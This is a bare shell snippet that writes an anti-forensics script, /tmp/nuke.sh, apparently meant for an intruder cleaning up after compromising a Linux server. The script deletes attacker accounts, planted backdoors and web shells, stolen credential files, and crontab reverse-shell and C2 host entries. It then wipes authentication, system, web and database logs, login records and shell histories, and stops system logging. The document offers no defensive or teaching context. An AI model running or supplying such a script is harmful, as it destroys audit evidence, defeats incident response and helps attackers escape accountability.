cat > /tmp/nuke.sh << 'EOFSCRIPT'
#!/bin/bash
echo "[*] Nuking all evidence..."
pkill -u matrix 2>/dev/null; pkill -u max 2>/dev/null; sleep 1
userdel -r matrix 2>/dev/null; userdel -r max 2>/dev/null
rm -rf /tmp/bashdoor /tmp/cc.txt /tmp/creds.txt /dev/shm/root.hash
rm -rf /tmp/.stash /home/matrix /home/max
rm -f /var/www/backdoor.php /var/www/.shell.php
rm -f /usr/local/bin/.backdoor.sh /usr/share/man/man3/.loader
sed -i '/192.168.1.7/d' /etc/crontab 2>/dev/null
sed -i '/nc -e/d' /etc/crontab 2>/dev/null
rm -rf /home/*/.ssh/authorized_keys 2>/dev/null
sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config 2>/dev/null
sed -i '/evil.com/d' /etc/hosts 2>/dev/null; sed -i '/c2-server/d' /etc/hosts 2>/dev/null
cd /var/log
for log in auth.log syslog messages debug daemon.log kern.log mail.log mail.info mail.warn user.log boot dmesg udev; do
  > $log 2>/dev/null; rm -f $log.? $log.?.gz 2>/dev/null
done
>/var/log/wtmp; >/var/log/btmp; >/var/log/lastlog; >/var/log/faillog
>/var/log/apache2/access.log 2>/dev/null; >/var/log/apache2/error.log 2>/dev/null
>/var/log/proftpd/proftpd.log 2>/dev/null; >/var/log/mysql/error.log 2>/dev/null
/etc/init.d/sysklogd stop 2>/dev/null
for home in /root /home/*; do rm -f $home/.bash_history $home/.bash_logout; ln -sf /dev/null $home/.bash_history 2>/dev/null; done
history -c; unset HISTFILE; export HISTSIZE=0
echo "[+] All traces removed. System appears clean."
EOFSCRIPT
